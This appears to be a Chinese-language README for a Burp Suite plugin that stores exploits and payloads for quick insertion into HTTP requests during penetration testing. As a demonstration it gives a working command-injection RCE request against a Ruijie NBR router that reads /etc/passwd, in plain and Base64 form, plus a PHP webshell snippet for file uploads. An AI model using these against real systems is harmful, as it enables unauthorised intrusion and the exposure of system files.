## 哆啦A梦的四次元口袋



### 前言

1、在渗透测试或挖 SRC 的时候每次都需要在笔记中复制一些 Payload 或 Webshell 内容觉得太麻烦了，所以打算 **抄一个** Burpsuite 插件，直接在 Burpsuite 中插入内容就简单多了。

2、在复现一些Http 请求的漏洞，每次都需要在笔记复制exp或写个简单的 python 脚本觉得太麻烦了，如果在 Burpsuite 中直接修改请求包就简单多了，所以就命名该Burpsuite 插件为 **哆啦A梦的四次元口袋** 吧。



### 使用

1、加载插件会在 Burpsuite 目录下新建了一个目录和二个文件

2、**使用 sublime text 来修改 exp.yaml 和 payload.yaml** （**yaml 语法**）

```
DAM_Config:
|_exp.yaml
|_payload.yaml
```



#### exp.yaml 文件：演示

获取 host 和 Cookie **修改整个数据包**（如果 Repeater 没有 Target 就使用不了）

host 和 cookie 的位置使用占位符 `%s`  ,  如果是未授权的就不需要 cookie。

```
POST /guest_auth/guestIsUp.php HTTP/1.1 
Host: %s
Connection: close Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 
Cookie: %s
Content-Type: application/x-www-form-urlencoded 
Content-Length: 56 

mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
```

然后把 exp   **Base64编码**

```
UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
```

编写 exp.yaml（**yaml 语法**）

```
锐捷漏洞:
  锐捷NBR路由器-前台RCE:
    UE9TVCAvZ3Vlc3RfYXV0aC9ndWVzdElzVXAucGhwIEhUVFAvMS4xIApIb3N0OiAlcwpDb25uZWN0aW9uOiBjbG9zZSBVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxIApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODUuMC40MTgzLjEyMSBTYWZhcmkvNTM3LjM2IApDb29raWU6ICVzCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIApDb250ZW50LUxlbmd0aDogNTYgCgptYWM9MSZpcD0xMjcuMC4wLjF8Y2F0IC9ldGMvcGFzc3dkID4gdGVzdC50eHQ=
```



#### payload.yaml 文件

该文件是把 **Payload 插入到数据包中**

```
<?php phpinfo();?>
```

需要把 payload  Base64 编码

```
PD9waHAgcGhwaW5mbygpOz8+
```

```
WebShell:
  phpinfo:
    PD9waHAgcGhwaW5mbygpOz8+
```

在文件上传的时候快速插入webshell，更多玩法自己挖掘...

![1](./images/2.png)

![1](./images/1.png)

### 参考

https://github.com/d3vilbug/HackBar
